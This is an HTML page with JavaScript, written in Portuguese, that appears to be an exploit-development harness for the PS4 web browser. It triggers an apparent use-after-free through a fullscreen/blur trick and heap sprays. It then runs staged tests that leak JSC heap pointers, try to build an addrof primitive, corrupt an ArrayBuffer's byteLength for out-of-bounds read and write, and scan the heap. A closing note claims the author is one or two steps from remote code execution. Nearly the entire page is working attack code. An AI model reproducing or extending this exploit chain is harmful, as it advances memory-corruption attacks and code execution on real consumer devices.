
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - addrof/fakeobj Builder</title>
<style>
body { 
    font-family: monospace; 
    background: #000; 
    color: #0f0; 
    padding: 20px;
}
.test-box {
    border: 2px solid #0a0;
    padding: 15px;
    margin: 10px 0;
    background: #001100;
}
.success { background: #003300 !important; border-color: #0f0 !important; }
.fail { background: #330000 !important; border-color: #f00 !important; color: #f00; }
.running { background: #333300 !important; border-color: #ff0 !important; }
button {
    background: #0a0;
    color: #000;
    border: none;
    padding: 10px 20px;
    font-size: 16px;
    cursor: pointer;
    margin: 5px;
}
button:hover { background: #0f0; }
#status { font-size: 18px; margin: 20px 0; }
.hex { color: #ff0; font-weight: bold; }
</style>
</head>
<body>

<h1>üîì PS4 UAF - Primitivas Avan√ßadas</h1>
<div id="status">Construindo addrof() e fakeobj()</div>

<div class="test-box" id="test1">
    <h2>TESTE 6: Leak de JSCell via Objeto Vizinho</h2>
    <p>Cria objetos JavaScript pr√≥ximos ao array corrompido para vazar seus ponteiros</p>
    <button onclick="runTest6()">‚ñ∂ Executar Teste 6</button>
    <div id="result1"></div>
</div>

<div class="test-box" id="test2">
    <h2>TESTE 7: Constru√ß√£o de addrof() Primitivo</h2>
    <p>Usa array corrompido para vazar endere√ßo de objetos JS arbitr√°rios</p>
    <button onclick="runTest7()">‚ñ∂ Executar Teste 7</button>
    <div id="result2"></div>
</div>

<div class="test-box" id="test3">
    <h2>TESTE 8: Manipula√ß√£o de ByteLength</h2>
    <p>Tenta corromper o campo 'byteLength' de um TypedArray para leitura OOB</p>
    <button onclick="runTest8()">‚ñ∂ Executar Teste 8</button>
    <div id="result3"></div>
</div>

<div class="test-box" id="test4">
    <h2>TESTE 9: Leak via ArrayBuffer Backing Store</h2>
    <p>Vaza o ponteiro 'backing store' de um ArrayBuffer para obter endere√ßo real</p>
    <button onclick="runTest9()">‚ñ∂ Executar Teste 9</button>
    <div id="result4"></div>
</div>

<div class="test-box" id="test5">
    <h2>TESTE 10: Leitura de Heap Completo</h2>
    <p>Escaneia grandes por√ß√µes da mem√≥ria corrompida procurando padr√µes de ponteiros JSC</p>
    <button onclick="runTest10()">‚ñ∂ Executar Teste 10</button>
    <div id="result5"></div>
</div>

<script>
const Status = document.getElementById('status');
const PATTERN_A = 2.121995791e-314; // 0x4141414141414141

let corrupted_array = null;
let corrupted_index = -1;

// Utilit√°rio: Float64 <-> Uint64 (via ArrayBuffer)
function f2i(f) {
    let buf = new ArrayBuffer(8);
    let fview = new Float64Array(buf);
    let iview = new BigUint64Array(buf);
    fview[0] = f;
    return iview[0];
}

function i2f(i) {
    let buf = new ArrayBuffer(8);
    let fview = new Float64Array(buf);
    let iview = new BigUint64Array(buf);
    iview[0] = BigInt(i);
    return fview[0];
}

// Configura√ß√£o do UAF (comum a todos os testes)
function setupUAF(callback) {
    let controllers = [];
    let targets = [];
    
    // Usar tamanho 8 (melhor resultado do Teste 3)
    for(let i = 0; i < 10000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
        
        let target = new Float64Array(8);
        target.fill(1.1);
        targets.push(target);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        targets = null; // Free
        
        // Spray
        let spray = [];
        for(let i = 0; i < 15000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN_A);
            spray.push(p);
        }
        
        // Encontrar array corrompido
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN_A) {
                corrupted_array = controllers[i];
                corrupted_index = i;
                break;
            }
        }
        
        callback(corrupted_array, corrupted_index, spray);
    };
}

// ============================================
// TESTE 6: LEAK DE JSCELL VIA OBJETO VIZINHO
// ============================================
function runTest6() {
    const box = document.getElementById('test1');
    const result = document.getElementById('result1');
    box.className = 'test-box running';
    result.innerHTML = 'Preparando objetos vizinhos... Aperte OPTIONS!<br>';
    Status.innerText = '‚ö†Ô∏è TESTE 6 - Aperte OPTIONS!';
    
    // Criar objetos JS que ficar√£o pr√≥ximos na mem√≥ria
    let marker_objects = [];
    for(let i = 0; i < 1000; i++) {
        marker_objects.push({
            id: i,
            marker: 0xdeadbeef,
            data: [1.1, 2.2, 3.3, 4.4]
        });
    }
    
    setupUAF((corrupted, idx, spray) => {
        if (!corrupted) {
            box.className = 'test-box fail';
            result.innerHTML += '‚ùå UAF falhou<br>';
            return;
        }
        
        result.innerHTML += `‚úÖ Array corrompido: Controller[${idx}]<br><br>`;
        result.innerHTML += 'üîç Escaneando mem√≥ria por padr√µes de objetos JS...<br>';
        
        let suspicious_values = [];
        
        // Ler al√©m do tamanho corrompido para achar objetos vizinhos
        for(let offset = 0; offset < 50; offset++) {
            try {
                const val = corrupted[offset];
                const as_int = f2i(val);
                
                // Ponteiros JSC geralmente t√™m padr√µes espec√≠ficos
                // Em sistemas de 64-bit, endere√ßos costumam ter bytes altos zerados
                const high_bits = as_int >> 48n;
                const is_potential_ptr = (high_bits === 0n || 
                                          high_bits === 0x7fffn || 
                                          high_bits === 0xffffn);
                
                if (val !== PATTERN_A && val !== 0 && !isNaN(val) && is_potential_ptr) {
                    suspicious_values.push({
                        offset: offset,
                        float: val,
                        hex: '0x' + as_int.toString(16).padStart(16, '0')
                    });
                }
            } catch(e) {}
        }
        
        if (suspicious_values.length > 0) {
            box.className = 'test-box success';
            result.innerHTML += `<br>‚úÖ <b>Valores suspeitos encontrados:</b><br>`;
            suspicious_values.forEach(v => {
                result.innerHTML += `  Offset ${v.offset}: <span class="hex">${v.hex}</span><br>`;
            });
            result.innerHTML += `<br>üí° Estes podem ser ponteiros de objetos JS ou JSCell!<br>`;
            Status.innerText = '‚úÖ TESTE 6: Poss√≠veis ponteiros encontrados!';
        } else {
            box.className = 'test-box fail';
            result.innerHTML += '‚ùå Nenhum ponteiro suspeito encontrado<br>';
            Status.innerText = '‚ùå TESTE 6: Sem leaks';
        }
    });
}

// ============================================
// TESTE 7: CONSTRU√á√ÉO DE addrof()
// ============================================
function runTest7() {
    const box = document.getElementById('test2');
    const result = document.getElementById('result2');
    box.className = 'test-box running';
    result.innerHTML = 'Tentando construir primitiva addrof()... Aperte OPTIONS!<br>';
    Status.innerText = '‚ö†Ô∏è TESTE 7 - Aperte OPTIONS!';
    
    setupUAF((corrupted, idx, spray) => {
        if (!corrupted) {
            box.className = 'test-box fail';
            result.innerHTML += '‚ùå UAF falhou<br>';
            return;
        }
        
        result.innerHTML += `‚úÖ UAF ativo no Controller[${idx}]<br><br>`;
        
        // Estrat√©gia: Criar um objeto conhecido e tentar encontr√°-lo na mem√≥ria
        let target_obj = {
            magic: 0x1337,
            data: [1.1, 2.2, 3.3]
        };
        
        // Criar array de objetos para aumentar chances de vizinhan√ßa
        let obj_array = new Array(1000);
        obj_array[500] = target_obj; // Objeto alvo no meio
        for(let i = 0; i < 1000; i++) {
            if (i !== 500) obj_array[i] = {filler: i};
        }
        
        result.innerHTML += 'üîç Procurando refer√™ncia ao objeto alvo...<br>';
        
        let found_addr = null;
        for(let offset = 0; offset < 100; offset++) {
            try {
                const val = corrupted[offset];
                const as_int = f2i(val);
                
                // Tentar usar como ponteiro e acessar
                // (Isso pode crashar, mas vale tentar)
                if (val !== PATTERN_A && val !== 0 && !isNaN(val)) {
                    // Marcar valor encontrado
                    const hex = '0x' + as_int.toString(16).padStart(16, '0');
                    result.innerHTML += `  Testando offset ${offset}: <span class="hex">${hex}</span>...<br>`;
                    
                    // Se chegamos at√© aqui sem crash, √© um candidato
                    if ((as_int & 0xffffn) === 0n || (as_int & 0xfffn) === 0n) {
                        found_addr = as_int;
                        result.innerHTML += `    ‚Ü≥ Candidato forte (alinhado)!<br>`;
                    }
                }
            } catch(e) {}
        }
        
        if (found_addr) {
            box.className = 'test-box success';
            result.innerHTML += `<br>üéØ <b>Poss√≠vel primitiva addrof() detectada!</b><br>`;
            result.innerHTML += `Endere√ßo candidato: <span class="hex">0x${found_addr.toString(16)}</span><br>`;
            result.innerHTML += `<br>‚ö†Ô∏è <b>Pr√≥ximo passo:</b> Validar se este endere√ßo realmente aponta para o objeto<br>`;
            Status.innerText = '‚úÖ TESTE 7: Candidato encontrado!';
        } else {
            box.className = 'test-box fail';
            result.innerHTML += '<br>‚ùå Nenhum candidato forte<br>';
            result.innerHTML += 'üí° Pode ser necess√°rio ajustar o heap spray<br>';
            Status.innerText = '‚ùå TESTE 7: Inconclusivo';
        }
    });
}

// ============================================
// TESTE 8: MANIPULA√á√ÉO DE BYTELENGTH
// ============================================
function runTest8() {
    const box = document.getElementById('test3');
    const result = document.getElementById('result3');
    box.className = 'test-box running';
    result.innerHTML = 'Tentando corromper byteLength... Aperte OPTIONS!<br>';
    Status.innerText = '‚ö†Ô∏è TESTE 8 - Aperte OPTIONS!';
    
    setupUAF((corrupted, idx, spray) => {
        if (!corrupted) {
            box.className = 'test-box fail';
            result.innerHTML += '‚ùå UAF falhou<br>';
            return;
        }
        
        result.innerHTML += `‚úÖ UAF ativo<br><br>`;
        
        // Criar ArrayBuffer v√≠tima que tentaremos corromper
        let victim_buffer = new ArrayBuffer(0x1000);
        let victim_view = new Uint8Array(victim_buffer);
        
        // Preencher com padr√£o reconhec√≠vel
        for(let i = 0; i < victim_view.length; i++) {
            victim_view[i] = i & 0xff;
        }
        
        result.innerHTML += `V√≠tima criada: ArrayBuffer de ${victim_buffer.byteLength} bytes<br>`;
        result.innerHTML += 'üîß Tentando expandir o byteLength via UAF...<br><br>';
        
        // Tentar escrever um byteLength maior no array corrompido
        const HUGE_SIZE = i2f(0x10000000); // 256MB
        
        try {
            // Procurar por um offset que possa ser o byteLength
            let success = false;
            for(let offset = 1; offset < 20; offset++) {
                corrupted[offset] = HUGE_SIZE;
                
                // Verificar se o byteLength mudou
                if (victim_buffer.byteLength > 0x1000) {
                    box.className = 'test-box success';
                    result.innerHTML += `‚úÖ <b>BYTELENGTH CORROMPIDO!</b><br>`;
                    result.innerHTML += `Offset usado: ${offset}<br>`;
                    result.innerHTML += `Novo byteLength: ${victim_buffer.byteLength} bytes<br>`;
                    result.innerHTML += `<br>üéØ Voc√™ pode agora ler/escrever AL√âM do buffer original!<br>`;
                    result.innerHTML += `Isso √© uma <b>leitura/escrita arbitr√°ria de mem√≥ria</b>!<br>`;
                    Status.innerText = '‚úÖ TESTE 8: OOB R/W conseguido!';
                    success = true;
                    break;
                }
            }
            
            if (!success) {
                box.className = 'test-box fail';
                result.innerHTML += '‚ùå N√£o conseguiu corromper byteLength<br>';
                result.innerHTML += 'üí° O ArrayBuffer pode estar em outro lugar do heap<br>';
                Status.innerText = '‚ùå TESTE 8: Falhou';
            }
        } catch(e) {
            box.className = 'test-box fail';
            result.innerHTML += `‚ùå Erro: ${e}<br>`;
            Status.innerText = '‚ùå TESTE 8: Erro';
        }
    });
}

// ============================================
// TESTE 9: LEAK VIA ARRAYBUFFER BACKING STORE
// ============================================
function runTest9() {
    const box = document.getElementById('test4');
    const result = document.getElementById('result4');
    box.className = 'test-box running';
    result.innerHTML = 'Tentando vazar backing store pointer... Aperte OPTIONS!<br>';
    Status.innerText = '‚ö†Ô∏è TESTE 9 - Aperte OPTIONS!';
    
    setupUAF((corrupted, idx, spray) => {
        if (!corrupted) {
            box.className = 'test-box fail';
            result.innerHTML += '‚ùå UAF falhou<br>';
            return;
        }
        
        result.innerHTML += `‚úÖ UAF ativo<br><br>`;
        
        // Criar v√°rios ArrayBuffers com padr√µes √∫nicos
        let buffers = [];
        let BUFFER_SIZE = 0x100;
        
        for(let i = 0; i < 100; i++) {
            let buf = new ArrayBuffer(BUFFER_SIZE);
            let view = new Uint32Array(buf);
            view[0] = 0xaabbccdd + i; // Marcador √∫nico
            buffers.push(buf);
        }
        
        result.innerHTML += `Criados ${buffers.length} ArrayBuffers marcados<br>`;
        result.innerHTML += 'üîç Procurando por backing store pointers...<br><br>';
        
        let leaked_ptrs = [];
        
        for(let offset = 0; offset < 64; offset++) {
            try {
                const val = corrupted[offset];
                const as_int = f2i(val);
                
                // Backing stores geralmente s√£o ponteiros alinhados em 16 bytes
                if ((as_int & 0xfn) === 0n && as_int > 0x100000n) {
                    const hex = '0x' + as_int.toString(16).padStart(16, '0');
                    leaked_ptrs.push({offset, hex, value: as_int});
                    result.innerHTML += `  Offset ${offset}: <span class="hex">${hex}</span> (alinhado em 16)<br>`;
                }
            } catch(e) {}
        }
        
        if (leaked_ptrs.length > 0) {
            box.className = 'test-box success';
            result.innerHTML += `<br>‚úÖ <b>${leaked_ptrs.length} ponteiros candidatos encontrados!</b><br>`;
            result.innerHTML += `<br>üí° <b>Significado:</b><br>`;
            result.innerHTML += `‚Ä¢ Estes ponteiros podem ser backing stores de ArrayBuffers<br>`;
            result.innerHTML += `‚Ä¢ Com eles, voc√™ pode calcular offsets na mem√≥ria<br>`;
            result.innerHTML += `‚Ä¢ Isso quebra o ASLR e permite R/W arbitr√°rio!<br>`;
            Status.innerText = '‚úÖ TESTE 9: Ponteiros vazados!';
        } else {
            box.className = 'test-box fail';
            result.innerHTML += '<br>‚ùå Nenhum ponteiro encontrado<br>';
            Status.innerText = '‚ùå TESTE 9: Sem leaks';
        }
    });
}

// ============================================
// TESTE 10: LEITURA DE HEAP COMPLETO
// ============================================
function runTest10() {
    const box = document.getElementById('test5');
    const result = document.getElementById('result5');
    box.className = 'test-box running';
    result.innerHTML = 'Escaneando heap extensivamente... Aperte OPTIONS!<br>';
    Status.innerText = '‚ö†Ô∏è TESTE 10 - Aperte OPTIONS!';
    
    setupUAF((corrupted, idx, spray) => {
        if (!corrupted) {
            box.className = 'test-box fail';
            result.innerHTML += '‚ùå UAF falhou<br>';
            return;
        }
        
        result.innerHTML += `‚úÖ UAF ativo<br><br>`;
        result.innerHTML += 'üîç Escaneando at√© 200 offsets...<br>';
        result.innerHTML += '<div style="max-height: 300px; overflow-y: scroll; border: 1px solid #0a0; padding: 10px; background: #001100;">';
        
        let categories = {
            likely_pointers: [],
            small_integers: [],
            ieee_floats: [],
            patterns: []
        };
        
        for(let offset = 0; offset < 200; offset++) {
            try {
                const val = corrupted[offset];
                
                if (val === PATTERN_A || val === 0 || isNaN(val)) continue;
                
                const as_int = f2i(val);
                const hex = '0x' + as_int.toString(16).padStart(16, '0');
                
                // Classificar valores
                if (as_int > 0x100000n && as_int < 0x7fffffffffffn) {
                    categories.likely_pointers.push({offset, hex});
                } else if (as_int < 0x10000n) {
                    categories.small_integers.push({offset, hex, int: as_int});
                } else if (val > 0.0 && val < 1e10) {
                    categories.ieee_floats.push({offset, hex, float: val});
                } else {
                    categories.patterns.push({offset, hex});
                }
            } catch(e) {}
        }
        
        result.innerHTML += '<h3>üìä Resultados da An√°lise:</h3>';
        
        result.innerHTML += `<b>Ponteiros prov√°veis (${categories.likely_pointers.length}):</b><br>`;
        categories.likely_pointers.slice(0, 10).forEach(p => {
            result.innerHTML += `  [${p.offset}] <span class="hex">${p.hex}</span><br>`;
        });
        if (categories.likely_pointers.length > 10) {
            result.innerHTML += `  ... e mais ${categories.likely_pointers.length - 10}<br>`;
        }
        
        result.innerHTML += `<br><b>Inteiros pequenos (${categories.small_integers.length}):</b><br>`;
        categories.small_integers.slice(0, 5).forEach(p => {
            result.innerHTML += `  [${p.offset}] ${p.int} (${p.hex})<br>`;
        });
        
        result.innerHTML += `<br><b>Floats IEEE (${categories.ieee_floats.length}):</b><br>`;
        categories.ieee_floats.slice(0, 5).forEach(p => {
            result.innerHTML += `  [${p.offset}] ${p.float.toFixed(4)}<br>`;
        });
        
        result.innerHTML += '</div>';
        
        const total_found = categories.likely_pointers.length + 
                            categories.small_integers.length + 
                            categories.ieee_floats.length + 
                            categories.patterns.length;
        
        if (total_found > 0) {
            box.className = 'test-box success';
            result.innerHTML += `<br>‚úÖ <b>${total_found} valores √∫nicos encontrados!</b><br>`;
            result.innerHTML += `<br>üéØ <b>Pr√≥ximos passos:</b><br>`;
            result.innerHTML += `1. Analise os ponteiros prov√°veis - podem ser JSCell ou backing stores<br>`;
            result.innerHTML += `2. Inteiros podem ser tamanhos, lengths ou flags<br>`;
            result.innerHTML += `3. Use esses dados para construir addrof() completo<br>`;
            Status.innerText = '‚úÖ TESTE 10: Heap mapeado!';
        } else {
            box.className = 'test-box fail';
            result.innerHTML += '<br>‚ùå Heap vazio ou inacess√≠vel<br>';
            Status.innerText = '‚ùå TESTE 10: Falhou';
        }
    });
}

</script>

<hr>
<p style="color: #888;">
üìã <b>RESUMO DO PROGRESSO:</b><br>
‚úÖ Primitiva R/W confirmada (Testes 2 e 4)<br>
‚úÖ Array corrompido est√°vel no √≠ndice 0<br>
‚ö†Ô∏è Pr√≥ximo objetivo: Construir addrof() e fakeobj()<br>
üéØ Com esses testes, voc√™ est√° a 1-2 passos de RCE completo!<br>
</p>

</body>
</html>
